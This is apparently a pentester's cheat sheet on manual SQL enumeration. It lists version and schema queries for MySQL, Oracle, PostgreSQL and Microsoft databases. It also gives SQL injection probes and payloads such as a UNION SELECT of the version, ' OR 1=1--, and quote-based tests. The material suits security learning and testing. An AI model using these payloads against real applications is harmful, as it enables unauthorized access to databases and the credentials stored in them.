# Manual SQL Enumeration 
A collection of useful notes, resources and tips when working with a MySQL service.

##### Basic Commands
https://devhints.io/mysql

Connect to DB

```
mysql -u USERNAME -p DATABASE_NAME
```

Basic Enumeration

```
\g show tables;
```

```
\g select * from TABLE_NAME
```


##### Database Version
The queries to determine the database version for some popular database types are:

*Microsoft, MySQL*
`SELECT @@version`

*Oracle*
`SELECT * FROM v$version`

*PostgreSQL*
`SELECT version()`

Example UNION attack:
```
' UNION SELECT @@version--`
```


##### Comments
Comment out the rest of the query 

```
'--
```

OR always return true

```
' OR 1=1-- 
```

**Comments**
You can use comments to truncate a query and remove the portion of the original query that follows your input.

Oracle
`--comment   `

Microsoft
`--comment   /*comment*/`

PostgreSQL
`--comment   /*comment*/`

MySQL
`#comment`  
`-- comment`Â [Note the space after the double dash]  
`/*comment*/`


##### Check for possible Injection

Added in a quote should throw an error.

```
value=xxx'
```

Added in two quotes should fix the error.

```
value=xxx''
```

Then check it is executing SQL statements.

```
value=xxx'||(SELECT '')||'

# If this fails, try an Oracle version

value=xxx'||(SELECT '' FROM dual)||'
```

##### Examining Table Structure
Below are two approaches to enumerate the database and table structures available.

###### Common
You can query `information_schema.tables` to list the tables in the database:

`SELECT * FROM information_schema.tables`

This returns output like the following:

`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE ===================================================== MyDatabase dbo Products BASE TABLE MyDatabase dbo Users BASE TABLE MyDatabase dbo Feedback BASE TABLE`

This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.

You can then query `information_schema.columns` to list the columns in individual tables:

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

This returns output like the following:

`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE ================================================================= MyDatabase dbo Users UserId int MyDatabase dbo Users Username varchar MyDatabase dbo Users Password varchar`

###### Oracle
You can list tables by querying `all_tables`:

`SELECT * FROM all_tables`

And you can list columns by querying `all_tab_columns`:

`SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`


